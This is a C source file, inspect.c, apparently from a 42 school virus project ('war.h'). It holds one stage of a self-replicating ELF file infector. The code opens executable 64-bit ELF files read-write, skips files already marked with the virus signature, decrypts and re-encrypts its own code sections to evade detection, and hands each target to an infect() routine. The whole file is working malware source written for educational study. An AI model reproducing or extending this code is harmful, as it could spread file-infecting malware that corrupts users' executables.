/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   inspect.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/31 19:28:21 by ddinaut           #+#    #+#             */
/*   Updated: 2019/04/02 11:32:38 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"

void	inspect(t_data *data, char *path)
{
	revert_one(&data->key, (char*)locate, (size_t)inspect - (size_t)locate);

#ifdef DEBUG
	char de[] = "inspect\t \n";
	data->context == true ?	de[8] = 49 : 48;
	_write(1, de, _strlen(de));
#endif

	if (data->context != true)
		goto ERR;

	struct stat st;

  	if ((data->bin.fd = _open(path, O_RDWR, 0000)) < 0)
		goto ERR;
	if (_fstat(data->bin.fd, &st) < 0)
		goto ERR;
	if (!(st.st_mode & S_IXUSR))
		goto ERR;
	if ((data->bin.map = _mmap(NULL, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, data->bin.fd, 0)) == MAP_FAILED)
		goto ERR;

	data->bin.size = st.st_size;
	data->header = (Elf64_Ehdr*)data->bin.map;
	if ((*((unsigned char*)data->header + EI_MAG0) != ELFMAG0) || \
		(*((unsigned char*)data->header + EI_MAG1) != ELFMAG1) || \
		(*((unsigned char*)data->header + EI_MAG2) != ELFMAG2) || \
		(*((unsigned char*)data->header + EI_MAG3) != ELFMAG3) || \
		(*((unsigned char*)data->header + EI_CLASS) != ELFCLASS64) || \
		(*(uint32_t*)&data->header->e_ident[EI_PAD] == SIGNATURE))
	{
		_munmap(data->bin.map, st.st_size);
		goto ERR;
	}
	data->context = true;

#ifdef DEBUG
	_write(1, path, _strlen(path));
	char c = '\n';
	_write(1, &c, 1);
#endif

ERR:

	update_one(&data->key, (char*)inspect, (size_t)infect - (size_t)inspect);
	revert_one(&data->key, (char*)infect, (size_t)inject - (size_t)infect);

	infect(data);
}
